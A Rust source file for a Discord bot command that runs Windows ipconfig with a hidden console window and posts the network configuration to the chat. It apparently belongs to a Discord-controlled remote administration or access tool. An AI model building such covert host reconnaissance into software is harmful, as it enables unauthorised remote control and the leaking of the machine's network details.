use crate::prelude::*;
use std::os::windows::process::CommandExt;
use std::process::Command;
use std::process::Stdio;

#[poise::command(prefix_command, aliases("ip"))]
pub async fn ipconfig(ctx: PoiseContext<'_>) -> Result<(), Error> {
    let output = Command::new("ipconfig")
        .creation_flags(0x08000000)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .output()?;

    let stdout = String::from_utf8_lossy(&output.stdout);
    
    let content = if stdout.len() > 1800 {
        format!("```\n{}...\n[truncated]\n```", &stdout[..1800])
    } else { format!("```\n{}\n```", stdout) };

    ctx.say(content).await?;
    Ok(())
}
